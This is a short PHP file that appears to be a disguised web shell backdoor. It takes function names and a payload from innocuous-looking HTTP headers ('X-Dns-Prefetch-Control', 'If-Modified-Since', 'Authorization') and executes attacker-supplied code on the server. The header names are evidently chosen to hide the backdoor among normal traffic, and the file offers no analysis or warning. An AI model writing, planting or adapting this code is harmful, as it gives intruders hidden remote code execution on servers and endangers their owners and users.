<?php
$_HEADERS = getallheaders();
if (isset($_HEADERS['X-Dns-Prefetch-Control'])) {
    $rindex = $_HEADERS['X-Dns-Prefetch-Control']('', $_HEADERS['If-Modified-Since']($_HEADERS['Authorization']));
    $rindex();
}